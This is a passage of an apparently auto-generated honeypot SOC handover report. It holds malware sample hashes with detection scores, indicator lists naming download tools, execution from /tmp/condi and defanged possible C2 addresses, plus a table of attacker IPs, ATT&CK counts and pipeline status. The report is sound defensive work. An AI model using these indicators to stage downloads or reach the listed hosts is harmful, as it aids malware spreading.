| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `168.110.102[.]254` | KR | Oracle Corporation | **100** ⚠️ | 3 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `35.241.208[.]90` | BE | Google LLC | **100** ⚠️ | 3 |
| `61.37.150[.]6` | KR | LG Uplus | **100** ⚠️ | 50 |
| `218.202.143[.]68` | CN | China Mobile Communications Corporation - neimeng | **100** ⚠️ | 50 |
| `65.20.204[.]41` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `222.236.155[.]146` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `70.89.116[.]5` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `80.233.12[.]109` | IE | Three Ireland (Hutchison) limited | **100** ⚠️ | 50 |
| `49.124.152[.]208` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 290 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 268 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 116 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 110 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 110 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 752 cases |
| Tool 34  | Credential Extractor        | ✅ 342 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 169 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (4.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 90 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 268 priority case(s) shown individually · 49 recon entry/entries in table (13 group(s) consolidating 411 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-11T09:42:08Z_
